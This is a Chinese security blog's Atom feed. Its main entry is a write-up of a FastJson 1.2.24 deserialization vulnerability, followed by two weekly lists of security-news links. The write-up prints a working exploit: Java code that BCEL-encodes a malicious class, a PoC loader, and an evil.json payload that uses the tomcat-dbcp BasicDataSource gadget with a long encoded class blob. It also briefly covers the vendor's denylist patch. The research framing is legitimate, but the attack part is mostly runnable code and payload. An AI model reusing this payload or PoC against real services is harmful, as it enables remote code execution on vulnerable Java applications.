<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>M0rk&#39;s Blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://kevien.github.io/"/>
  <updated>2018-06-17T18:55:47.362Z</updated>
  <id>http://kevien.github.io/</id>
  
  <author>
    <name>M0rk</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>FastJson反序列化漏洞(续)</title>
    <link href="http://kevien.github.io/2018/06/18/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(%E7%BB%AD)/"/>
    <id>http://kevien.github.io/2018/06/18/FastJson反序列化漏洞(续)/</id>
    <published>2018-06-17T18:47:07.000Z</published>
    <updated>2018-06-17T18:55:47.362Z</updated>
    
    <content type="html"><![CDATA[<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
<li>之前写了篇fastjson反序列化漏洞的分析文章，见<a href="https://www.cnblogs.com/mrchang/p/6789060.html" target="_blank" rel="external">Fastjson反序列化漏洞研究</a>,最近<br>读了这篇文章<a href="http://www.freebuf.com/articles/others-articles/167932.html" target="_blank" rel="external">DefineClass在Java反序列化当中的利用</a>深受启发，学习到了另外的利用姿势.本来很早就应该填的坑，因为一些琐事导致现在才更:(</li>
<li>作者文章写的很好，只是有些点以及代码没有完全给出来，所以需要自己去测试。<h4 id="details"><a href="#details" class="headerlink" title="details"></a>details</h4></li>
<li>在上面的文章中作者是利用了tomcat-dbcp.jar组件中org.apache.tomcat.dbcp.dbcp.BasicDataSource类的Class.forName()方法，关于Class.forName执行代码的方法，有两种（作者也在文章中介绍了），这个Class.forName是关键，它可以设置classLoader和classname，从而加载.class文件，恶意的.class中静态代码块儿static{}会执行。下面给出文章中一些缺少的代码。关于ClassLoader的机制可以参考@frozenme女装大佬的文章(很棒)：P<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">package FastJsonDemo;</div><div class="line">import com.sun.org.apache.bcel.internal.classfile.Utility;</div><div class="line"></div><div class="line">import java.nio.file.Files;</div><div class="line">import java.nio.file.Path;</div><div class="line">import java.nio.file.Paths;</div><div class="line"></div><div class="line">public class BCELencode &#123;</div><div class="line">    public static void main(String []args) throws Exception&#123;</div><div class="line">        //There also should be compiled class file,not java file</div><div class="line">        Path path = Paths.get(&quot;/Users/m0rk/Desktop/tmp/untitled/src/FastJsonDemo/evil.class&quot;);</div><div class="line">        byte[] data = Files.readAllBytes(path);</div><div class="line">        String s =  Utility.encode(data,true);</div><div class="line">        System.out.print(s);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>这里用于将evil.class文件进行BCEL编码。</p>
<ul>
<li><p>在作者的poc的基础上精简了一下，读取json文件触发漏洞。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">package FastJsonDemo;</div><div class="line"></div><div class="line">import com.alibaba.fastjson.JSON;</div><div class="line">import com.sun.org.apache.bcel.internal.util.ClassLoader;</div><div class="line">import jdk.internal.dynalink.support.TypeUtilities;</div><div class="line"></div><div class="line">import java.io.IOException;</div><div class="line">import java.io.InputStream;</div><div class="line">import java.io.InputStreamReader;</div><div class="line">import java.io.FileInputStream;</div><div class="line">import java.io.BufferedReader;</div><div class="line"></div><div class="line"></div><div class="line">public class FastJsonPwn  &#123;</div><div class="line"></div><div class="line">    public static void readToBuffer(StringBuffer buffer, String filePath) throws IOException &#123;</div><div class="line">        InputStream is = new FileInputStream(filePath);</div><div class="line">        String line; // 用来保存每行读取的内容</div><div class="line">        BufferedReader reader = new BufferedReader(new InputStreamReader(is));</div><div class="line">        line = reader.readLine(); // 读取第一行</div><div class="line">        while (line != null) &#123; // 如果 line 为空说明读完了</div><div class="line">            buffer.append(line); // 将读到的内容添加到 buffer 中</div><div class="line">            buffer.append(&quot;\n&quot;); // 添加换行符</div><div class="line">            line = reader.readLine(); // 读取下一行</div><div class="line">        &#125;</div><div class="line">        reader.close();</div><div class="line">        is.close();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static void main(String[] args) throws Exception&#123;</div><div class="line">        String s = &quot;java.lang.Thread&quot;;</div><div class="line">        //long hash = TypeUtilities.fnv1a_64(s);</div><div class="line"></div><div class="line">        //Class.forName(&quot;FastJsonDemo.Run&quot;);</div><div class="line"></div><div class="line">//        String classname = &quot;org.apache.log4j.spi$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmS$ebN$d4P$Q$fe$ce$deZJq$97$C$a2$e0$F$Qq$Xe$eb$V$_$m$8a$Lh$b2h$8c$r$90$V$ff$9c$z$tP$ed$b6$b5$3d$cb$e5Q$7c$C$S$ff$n$J$Q$8d$3e$80$Pe$9c6$h$40$dc$3fg$ce$f9$e6$9b$99o$a6$d3$df$7f$be$ff$Cp$l$af4$f4aT$c1u$N$v$8cv$d01$a6$e2Fl$8b$wJ$g$c6qS$83$8e$5b$w$sb$5bV$60$aa$b8$ad$e2$8e$8a$bb$w$eei$94$e2A$7cL$wx$a8$a1$H$8f$U$3cf$c8$c9$8dP$f05$Gc$f1$p$df$e4$a6$cb$bdus$v$c1$a6$Y$d2v$e3$8c$cb$92$a1$e3$ad$93$x7$edx$8e$9c$nN$b1$b4$cc$90$a9$f8k$82$n$bf$e8x$e2M$b3Q$X$e1$S$af$bb$84$a8$d3$b6$dbbvY$92$db$9f$5e$f3$mq$vxBJ$Y4$cbo$86$b6Xpbv$87$d8t$dcr$5cN$c7$A$G$J$98$T$N$df$8cQ$j$e7$d1$cf0$ec$H$c2$h2g$83$c0ul$$$j$df$8b$cc$Kw$ed$a6$cb$a5$l$96y$Q$e8$b8$80$8b$M$8a$l$95$3d$de$a0$3aS$3a$a6$f1T$c7$M$9e$91$dc$z$c7$d3$f1$i$b3$M$85$b3mQ$Q5$5c$W$db$a4$qe$daT$dd$ac$3b$9eY$e7$d1$G$B$T$b6$82$X$3a$w$98$d31$8f$F$86$9e$93$f8$f9m$5b$E$b1$Y$j$_c$d9$85$b3$c3$q$f6j$bb1$9e$d6$b0$TI$d1$60$e8$5c$X$f2mHm$86r$87a$ac$f8$7fX$a9$5d$a6N$e9$_$fa$5b$o$ac$f0$88$e4$f7$W$db$92T$db$f7$qw$bc$88a$f0t$e2$ca$G$P$z$f1$b9$v$3c$5bL$95$de3t$9f$f8$de5$3d$e94$u$a7F$c2$8e$l$7d$ff$Uh$c1T$nC$d3$a3$c9$V$8bm$da$3d$jA$j$da$o$8a$u$o$l$90S$s$bb$b1$Ur$5b$60$98v$ba$8fv$3e$F$z$fe$e6t$d3$e2O$9a$m$y$5e$L$3a$_$d1$eb2YF6$3b$7e$I$b6G$XF$Q$90K$c04T$5c9$a6$7eE$sA$3f$fc$40$aav$88$f4$3e2Fv$l9C9$82z$80$OC$3b$40$e7$X$M$e4$7eB$af$a5$8d$$$ab$961$ceY$b5$ec7$e4$ac$5d$f4$b7$e0$7c$M$XZp$f5$I$dd$e3$H0Vv$a1V$e9$d2$bbG$V$f2$b0$b0L$3fW$wQ2B$g$40$955d$c9$a3$a1$8a$$$f2w$T$p$8f$V$U$b0J$cc$ab$c4$d0$91$99$b4$U$MU$V$M$c7$3aG$92V$af$fd$F$N$5c$a2N$fb$D$A$A&quot;;</div><div class="line">//        ClassLoader cls = new com.sun.org.apache.bcel.internal.util.ClassLoader();</div><div class="line">//        Class.forName(classname, true, cls);</div><div class="line">        //note  project must contain dbcp external lib</div><div class="line">//        String poc = &quot; &#123;\n&quot; +</div><div class="line">//                &quot;\t\t\t\&quot;@type\&quot;: \&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource\&quot;,\n&quot; +</div><div class="line">//                &quot;\t\t\t\&quot;driverClassLoader\&quot;: &#123;\n&quot; +</div><div class="line">//                &quot;\t\t\t\t\&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot; +</div><div class="line">//                &quot;\t\t\t&#125;,\n&quot; +</div><div class="line">//                &quot;\t\t\t\&quot;driverClassName\&quot;: \&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmS$ebN$d4P$Q$fe$ce$deZJq$97$C$a2$e0$F$Qq$Xe$eb$V$_$m$8a$Lh$b2h$8c$r$90$V$ff$9c$z$tP$ed$b6$b5$3d$cb$e5Q$7c$C$S$ff$n$J$Q$8d$3e$80$Pe$9c6$h$40$dc$3fg$ce$f9$e6$9b$99o$a6$d3$df$7f$be$ff$Cp$l$af4$f4aT$c1u$N$v$8cv$d01$a6$e2Fl$8b$wJ$g$c6qS$83$8e$5b$w$sb$5bV$60$aa$b8$ad$e2$8e$8a$bb$w$eei$94$e2A$7cL$wx$a8$a1$H$8f$U$3cf$c8$c9$8dP$f05$Gc$f1$p$df$e4$a6$cb$bdus$v$c1$a6$Y$d2v$e3$8c$cb$92$a1$e3$ad$93$x7$edx$8e$9c$nN$b1$b4$cc$90$a9$f8k$82$n$bf$e8x$e2M$b3Q$X$e1$S$af$bb$84$a8$d3$b6$dbbvY$92$db$9f$5e$f3$mq$vxBJ$Y4$cbo$86$b6Xpbv$87$d8t$dcr$5cN$c7$A$G$J$98$T$N$df$8cQ$j$e7$d1$cf0$ec$H$c2$h2g$83$c0ul$$$j$df$8b$cc$Kw$ed$a6$cb$a5$l$96y$Q$e8$b8$80$8b$M$8a$l$95$3d$de$a0$3aS$3a$a6$f1T$c7$M$9e$91$dc$z$c7$d3$f1$i$b3$M$85$b3mQ$Q5$5c$W$db$a4$qe$daT$dd$ac$3b$9eY$e7$d1$G$B$T$b6$82$X$3a$w$98$d31$8f$F$86$9e$93$f8$f9m$5b$E$b1$Y$j$_c$d9$85$b3$c3$q$f6j$bb1$9e$d6$b0$TI$d1$60$e8$5c$X$f2mHm$86r$87a$ac$f8$7fX$a9$5d$a6N$e9$_$fa$5b$o$ac$f0$88$e4$f7$W$db$92T$db$f7$qw$bc$88a$f0t$e2$ca$G$P$z$f1$b9$v$3c$5bL$95$de3t$9f$f8$de5$3d$e94$u$a7F$c2$8e$l$7d$ff$Uh$c1T$nC$d3$a3$c9$V$8bm$da$3d$jA$j$da$o$8a$u$o$l$90S$s$bb$b1$Ur$5b$60$98v$ba$8fv$3e$F$z$fe$e6t$d3$e2O$9a$m$y$5e$L$3a$_$d1$eb2YF6$3b$7e$I$b6G$XF$Q$90K$c04T$5c9$a6$7eE$sA$3f$fc$40$aav$88$f4$3e2Fv$l9C9$82z$80$OC$3b$40$e7$X$M$e4$7eB$af$a5$8d$$$ab$961$ceY$b5$ec7$e4$ac$5d$f4$b7$e0$7c$M$XZp$f5$I$dd$e3$H0Vv$a1V$e9$d2$bbG$V$f2$b0$b0L$3fW$wQ2B$g$40$955d$c9$a3$a1$8a$$$f2w$T$p$8f$V$U$b0J$cc$ab$c4$d0$91$99$b4$U$MU$V$M$c7$3aG$92V$af$fd$F$N$5c$a2N$fb$D$A$A\&quot;\n&quot; +</div><div class="line">//                &quot;\t\t&#125;\n&quot;;</div><div class="line">        StringBuffer Buffer = new StringBuffer();</div><div class="line">        FastJsonPwn.readToBuffer(Buffer,&quot;/Users/m0rk/Desktop/tmp/untitled/src/FastJsonDemo/evil.json&quot;);</div><div class="line">        Object obj= JSON.parseObject(Buffer.toString());</div></pre></td></tr></table></figure>
</li>
<li><p>evil.json</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">  &quot;@type&quot; : &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,</div><div class="line">  &quot;driverClassLoader&quot; :</div><div class="line">  &#123;</div><div class="line">    &quot;@type&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</div><div class="line">  &#125;,</div><div class="line">  &quot;driverClassName&quot; : &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmS$ebN$d4P$Q$fe$ce$deZJq$97$C$a2$e0$F$Qq$Xe$eb$V$_$m$8a$Lh$b2h$8c$r$90$V$ff$9c$z$tP$ed$b6$b5$3d$cb$e5Q$7c$C$S$ff$n$J$Q$8d$3e$80$Pe$9c6$h$40$dc$3fg$ce$f9$e6$9b$99o$a6$d3$df$7f$be$ff$Cp$l$af4$f4aT$c1u$N$v$8cv$d01$a6$e2Fl$8b$wJ$g$c6qS$83$8e$5b$w$sb$5bV$60$aa$b8$ad$e2$8e$8a$bb$w$eei$94$e2A$7cL$wx$a8$a1$H$8f$U$3cf$c8$c9$8dP$f05$Gc$f1$p$df$e4$a6$cb$bdus$v$c1$a6$Y$d2v$e3$8c$cb$92$a1$e3$ad$93$x7$edx$8e$9c$nN$b1$b4$cc$90$a9$f8k$82$n$bf$e8x$e2M$b3Q$X$e1$S$af$bb$84$a8$d3$b6$dbbvY$92$db$9f$5e$f3$mq$vxBJ$Y4$cbo$86$b6Xpbv$87$d8t$dcr$5cN$c7$A$G$J$98$T$N$df$8cQ$j$e7$d1$cf0$ec$H$c2$h2g$83$c0ul$$$j$df$8b$cc$Kw$ed$a6$cb$a5$l$96y$Q$e8$b8$80$8b$M$8a$l$95$3d$de$a0$3aS$3a$a6$f1T$c7$M$9e$91$dc$z$c7$d3$f1$i$b3$M$85$b3mQ$Q5$5c$W$db$a4$qe$daT$dd$ac$3b$9eY$e7$d1$G$B$T$b6$82$X$3a$w$98$d31$8f$F$86$9e$93$f8$f9m$5b$E$b1$Y$j$_c$d9$85$b3$c3$q$f6j$bb1$9e$d6$b0$TI$d1$60$e8$5c$X$f2mHm$86r$87a$ac$f8$7fX$a9$5d$a6N$e9$_$fa$5b$o$ac$f0$88$e4$f7$W$db$92T$db$f7$qw$bc$88a$f0t$e2$ca$G$P$z$f1$b9$v$3c$5bL$95$de3t$9f$f8$de5$3d$e94$u$a7F$c2$8e$l$7d$ff$Uh$c1T$nC$d3$a3$c9$V$8bm$da$3d$jA$j$da$o$8a$u$o$l$90S$s$bb$b1$Ur$5b$60$98v$ba$8fv$3e$F$z$fe$e6t$d3$e2O$9a$m$y$5e$L$3a$_$d1$eb2YF6$3b$7e$I$b6G$XF$Q$90K$c04T$5c9$a6$7eE$sA$3f$fc$40$aav$88$f4$3e2Fv$l9C9$82z$80$OC$3b$40$e7$X$M$e4$7eB$af$a5$8d$$$ab$961$ceY$b5$ec7$e4$ac$5d$f4$b7$e0$7c$M$XZp$f5$I$dd$e3$H0Vv$a1V$e9$d2$bbG$V$f2$b0$b0L$3fW$wQ2B$g$40$955d$c9$a3$a1$8a$$$f2w$T$p$8f$V$U$b0J$cc$ab$c4$d0$91$99$b4$U$MU$V$M$c7$3aG$92V$af$fd$F$N$5c$a2N$fb$D$A$A&quot;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="/2018/06/18/FastJson反序列化漏洞(续)/pwn.png" alt=""><br>其它可能用到的代码已经放到<img src="https://github.com/kevien/javacode" alt="github"></p>
<h4 id="about-patch"><a href="#about-patch" class="headerlink" title="about patch"></a>about patch</h4><ul>
<li>笔者进行漏洞测试的版本是1.2.24，在17年12月11号，fastjson维护者更新了一段代码<img src="https://github.com/alibaba/fastjson/commit/eebea031d4d6f0a079c3d26845d96ad50c3aaccd" alt=""><br><img src="/2018/06/18/FastJson反序列化漏洞(续)/denylist.png" alt=""></li>
<li>作者将原来的denyList改为denyHashCodes的方式进行黑名单拦截（最新版本依然采用这种方式），其中denyHashCode的计算方式略微复杂，增加了攻击门槛。<br><img src="/2018/06/18/FastJson反序列化漏洞(续)/calculate.png" alt=""><h4 id="other"><a href="#other" class="headerlink" title="other"></a>other</h4></li>
<li>根据作者之前通过的denylist其实就可以知道这个漏洞的利用方式很多种，和python类似，java很多漏洞都还是绕denyList的问题。<h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4></li>
<li><a href="http://www.freebuf.com/articles/others-articles/167932.html" target="_blank" rel="external">DefineClass在Java反序列化当中的利用</a></li>
<li><a href="https://threathunter.org/topic/5a49570eec721b1f1966f30f" target="_blank" rel="external">Evading Anti-Virus by using dynamic code generation and reflection</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;TL-DR&quot;&gt;&lt;a href=&quot;#TL-DR&quot; class=&quot;headerlink&quot; title=&quot;TL;DR&quot;&gt;&lt;/a&gt;TL;DR&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;之前写了篇fastjson反序列化漏洞的分析文章，见&lt;a href=&quot;https://www.cnblo
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20180611安全动态</title>
    <link href="http://kevien.github.io/2018/06/11/20180611%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2018/06/11/20180611安全动态/</id>
    <published>2018-06-11T05:23:10.000Z</published>
    <updated>2018-06-11T05:23:10.973Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20180605安全动态</title>
    <link href="http://kevien.github.io/2018/06/04/20180605%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2018/06/04/20180605安全动态/</id>
    <published>2018-06-04T14:45:01.000Z</published>
    <updated>2018-06-08T02:36:46.708Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
<li>不要相信 PID，关于 PID 替换的逻辑漏洞介绍<br><a href="https://saelo.github.io/presentations/warcon18_dont_trust_the_pid.pdf" target="_blank" rel="external">https://saelo.github.io/presentations/warcon18_dont_trust_the_pid.pdf</a></li>
<li>查询 SPN 收集活动目录信息<br><a href="https://pentestlab.blog/2018/06/04/spn-discovery/" target="_blank" rel="external">https://pentestlab.blog/2018/06/04/spn-discovery/</a></li>
<li>Hadoop Yarn REST API 未授权漏洞利用挖矿分析<br><a href="https://paper.seebug.org/611/" target="_blank" rel="external">https://paper.seebug.org/611/</a></li>
<li>绕过 DEP 防护<br><a href="https://0x00sec.org/t/bypass-data-execution-protection-dep/6988" target="_blank" rel="external">https://0x00sec.org/t/bypass-data-execution-protection-dep/6988</a></li>
<li>在 Kali Linux 上安装 PowerShell 的教程<br><a href="https://www.kali.org/tutorials/installing-powershell-on-kali-linux/" target="_blank" rel="external">https://www.kali.org/tutorials/installing-powershell-on-kali-linux/</a></li>
<li>XSS 蠕虫的成因 Part 3<br><a href="https://brutelogic.com.br/blog/genesis-xss-worm-part-iii" target="_blank" rel="external">https://brutelogic.com.br/blog/genesis-xss-worm-part-iii</a></li>
<li>DeathStar - 调用 Empire RESTful API 自动化获取域管权限的 Python 脚本发布<br><a href="https://github.com/byt3bl33d3r/DeathStar" target="_blank" rel="external">https://github.com/byt3bl33d3r/DeathStar</a></li>
<li>DumpsterDiver - 用于分析大量各类型文件搜索硬编码密钥的工具<br><a href="https://github.com/securing/DumpsterDiver" target="_blank" rel="external">https://github.com/securing/DumpsterDiver</a></li>
<li>使用浏览器进行 C&amp;C 控制的工具介绍<br><a href="https://github.com/0x09AL/Browser-C2" target="_blank" rel="external">https://github.com/0x09AL/Browser-C2</a><br><a href="https://pentestlab.blog/2018/06/06/command-and-control-browser/" target="_blank" rel="external">https://pentestlab.blog/2018/06/06/command-and-control-browser/</a></li>
<li>detect-responder - 用于检测 Responder 的 osquery 扩展组件<br><a href="https://github.com/clong/detect-responder" target="_blank" rel="external">https://github.com/clong/detect-responder</a></li>
<li>puma-scan - 实时进行源代码安全性扫描分析的 Visual Studio 扩展<br><a href="https://github.com/pumasecurity/puma-scan" target="_blank" rel="external">https://github.com/pumasecurity/puma-scan</a></li>
<li>Java和Docker限制的那些事儿<br><a href="https://mp.weixin.qq.com/s/XUBXacXTX_CzeCxig0eNjw" target="_blank" rel="external">https://mp.weixin.qq.com/s/XUBXacXTX_CzeCxig0eNjw</a></li>
<li>Windows 10进程镂空技术（木马免杀）<br><a href="http://www.freebuf.com/articles/system/173532.html" target="_blank" rel="external">http://www.freebuf.com/articles/system/173532.html</a></li>
<li>发包开源工具TRex在IPS测试中的应用<br><a href="http://blog.nsfocus.net/trex/" target="_blank" rel="external">http://blog.nsfocus.net/trex/</a></li>
<li>HTTPoxyScan - HTTPoxy漏洞扫描器<br><a href="https://www.test404.com/post-1555.html" target="_blank" rel="external">https://www.test404.com/post-1555.html</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每周安全动态&quot;&gt;&lt;a href=&quot;#每周安全动态&quot; class=&quot;headerlink&quot; title=&quot;每周安全动态&quot;&gt;&lt;/a&gt;每周安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;不要相信 PID，关于 PID 替换的逻辑漏洞介绍&lt;br&gt;&lt;a href=&quot;https://sa
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20180525安全动态</title>
    <link href="http://kevien.github.io/2018/05/25/20180525%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2018/05/25/20180525安全动态/</id>
    <published>2018-05-25T05:11:32.000Z</published>
    <updated>2018-06-01T05:17:57.630Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
<li>使用 WinRM 进行横向渗透<br><a href="https://pentestlab.blog/2018/05/15/lateral-movement-winrm/" target="_blank" rel="external">https://pentestlab.blog/2018/05/15/lateral-movement-winrm/</a></li>
<li>红队网络基础设施建设<br><a href="https://paper.seebug.org/599/" target="_blank" rel="external">https://paper.seebug.org/599/</a></li>
<li>Cobalt Strike 修复 PowerShell Shellcode 注入在 Win10 上无法运行的问题<br><a href="https://blog.cobaltstrike.com/2018/05/24/powershell-shellcode-injection-on-win-10-v1803/" target="_blank" rel="external">https://blog.cobaltstrike.com/2018/05/24/powershell-shellcode-injection-on-win-10-v1803/</a></li>
<li>GNU glibc &lt; 2.27 缓冲区溢出漏洞 POC  (CVE-2018-11237)<br><a href="https://www.exploit-db.com/exploits/44750/" target="_blank" rel="external">https://www.exploit-db.com/exploits/44750/</a></li>
<li>Windows 事件日志的恶意利用 - 存储 Payloads 与配置信息<br><a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#111;&#58;&#104;&#116;&#x74;&#112;&#115;&#x3a;&#x2f;&#x2f;&#109;&#x65;&#100;&#x69;&#117;&#109;&#x2e;&#99;&#111;&#x6d;&#x2f;&#x40;&#x35;&#x79;&#120;&#47;&#119;&#105;&#110;&#x64;&#x6f;&#119;&#115;&#x2d;&#101;&#118;&#x65;&#x6e;&#x74;&#x2d;&#108;&#111;&#x67;&#45;&#116;&#111;&#45;&#116;&#104;&#101;&#45;&#100;&#97;&#x72;&#107;&#x2d;&#x73;&#x69;&#100;&#x65;&#x2d;&#115;&#116;&#111;&#114;&#105;&#x6e;&#x67;&#45;&#x70;&#x61;&#121;&#x6c;&#x6f;&#97;&#x64;&#x73;&#45;&#x61;&#110;&#x64;&#45;&#99;&#111;&#x6e;&#x66;&#x69;&#103;&#x75;&#x72;&#97;&#x74;&#x69;&#111;&#110;&#x73;&#x2d;&#x39;&#x63;&#56;&#x61;&#100;&#57;&#50;&#x36;&#x33;&#x37;&#x66;&#50;">&#104;&#116;&#x74;&#112;&#115;&#x3a;&#x2f;&#x2f;&#109;&#x65;&#100;&#x69;&#117;&#109;&#x2e;&#99;&#111;&#x6d;&#x2f;&#x40;&#x35;&#x79;&#120;&#47;&#119;&#105;&#110;&#x64;&#x6f;&#119;&#115;&#x2d;&#101;&#118;&#x65;&#x6e;&#x74;&#x2d;&#108;&#111;&#x67;&#45;&#116;&#111;&#45;&#116;&#104;&#101;&#45;&#100;&#97;&#x72;&#107;&#x2d;&#x73;&#x69;&#100;&#x65;&#x2d;&#115;&#116;&#111;&#114;&#105;&#x6e;&#x67;&#45;&#x70;&#x61;&#121;&#x6c;&#x6f;&#97;&#x64;&#x73;&#45;&#x61;&#110;&#x64;&#45;&#99;&#111;&#x6e;&#x66;&#x69;&#103;&#x75;&#x72;&#97;&#x74;&#x69;&#111;&#110;&#x73;&#x2d;&#x39;&#x63;&#56;&#x61;&#100;&#57;&#50;&#x36;&#x33;&#x37;&#x66;&#50;</a></li>
<li>CVE-2018-8174-msf - VBScript 远程代码执行漏洞 MSF 利用模块<br><a href="https://github.com/0x09AL/CVE-2018-8174-msf" target="_blank" rel="external">https://github.com/0x09AL/CVE-2018-8174-msf</a></li>
<li>D-Link DIR-620 路由器多个漏洞披露(CVE-2018-6212、CVE-2018-6213、CVE-2018-6211、CVE-2018-6210)<br><a href="https://securelist.com/backdoors-in-d-links-backyard/85530/" target="_blank" rel="external">https://securelist.com/backdoors-in-d-links-backyard/85530/</a></li>
<li>MacOS 上的日志审计工具 SUpraudit 介绍<br><a href="http://newosxbook.com/tools/supraudit.html" target="_blank" rel="external">http://newosxbook.com/tools/supraudit.html</a></li>
<li>chirp - 用于集中化管理 Google Alerts 信息的 GUI 工具<br><a href="https://github.com/9b/chirp" target="_blank" rel="external">https://github.com/9b/chirp</a></li>
<li>如何成为一名 web 安全研究人员，PortSwigger 的 James Kettle 给出了他的引导与建议<br><a href="https://portswigger.net/blog/so-you-want-to-be-a-web-security-researcher" target="_blank" rel="external">https://portswigger.net/blog/so-you-want-to-be-a-web-security-researcher</a></li>
<li>我是如何一步一步搞定小区的安防系统<br><a href="https://www.92ez.com/?action=show&amp;id=23469" target="_blank" rel="external">https://www.92ez.com/?action=show&amp;id=23469</a></li>
<li>deserialization-vulnerability<br><a href="https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf" target="_blank" rel="external">https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf</a></li>
<li>Fun with LDAP, Kerberos (and MSRPC) in AD Environments<br><a href="https://speakerdeck.com/ropnop/fun-with-ldap-kerberos-and-msrpc-in-ad-environments" target="_blank" rel="external">https://speakerdeck.com/ropnop/fun-with-ldap-kerberos-and-msrpc-in-ad-environments</a></li>
<li>五种寻找 “Domain Admin” 运行的进程的方法<br><a href="https://blog.netspi.com/5-ways-to-find-systems-running-domain-admin-processes/" target="_blank" rel="external">https://blog.netspi.com/5-ways-to-find-systems-running-domain-admin-processes/</a></li>
<li>burpa -  Slack 集成的 Burp Suite 自动化测试工具<br><a href="https://github.com/0x4D31/burpa" target="_blank" rel="external">https://github.com/0x4D31/burpa</a></li>
<li>spiderfoot - 开源情报收集工具 这里面的一些接口可以参考一下<br><a href="https://github.com/smicallef/spiderfoot" target="_blank" rel="external">https://github.com/smicallef/spiderfoot</a></li>
<li>对某Flask应用的简单审计<br><a href="http://foreversong.cn/archives/1206" target="_blank" rel="external">http://foreversong.cn/archives/1206</a></li>
<li>pwnedOrNot - 调用 haveibeenpwned API 检测邮箱账户密码是否泄露的脚本<br><a href="https://github.com/thewhiteh4t/pwnedOrNot" target="_blank" rel="external">https://github.com/thewhiteh4t/pwnedOrNot</a></li>
<li>Git 任意代码执行漏洞分析与解决方案(CVE-2018-11235)<br><a href="https://blogs.msdn.microsoft.com/devops/2018/05/29/announcing-the-may-2018-git-security-vulnerability/" target="_blank" rel="external">https://blogs.msdn.microsoft.com/devops/2018/05/29/announcing-the-may-2018-git-security-vulnerability/</a></li>
<li>使用 Ptrace 进行反调试的方法<br><a href="https://github.com/yellowbyte/analysis-of-anti-analysis/blob/master/research/hiding_call_to_ptrace/hiding_call_to_ptrace.md" target="_blank" rel="external">https://github.com/yellowbyte/analysis-of-anti-analysis/blob/master/research/hiding_call_to_ptrace/hiding_call_to_ptrace.md</a></li>
<li>25 个活动目录安全最佳实践<br><a href="https://activedirectorypro.com/active-directory-security-best-practices/" target="_blank" rel="external">https://activedirectorypro.com/active-directory-security-best-practices/</a></li>
<li>理解 Java  反序列化<br><a href="https://nytrosecurity.com/2018/05/30/understanding-java-deserialization/" target="_blank" rel="external">https://nytrosecurity.com/2018/05/30/understanding-java-deserialization/</a></li>
<li>Red Team 技术分享<br><a href="https://ringzer0team.com/d/A-Journey-Into-a-RedTeam-2018.pdf" target="_blank" rel="external">https://ringzer0team.com/d/A-Journey-Into-a-RedTeam-2018.pdf</a></li>
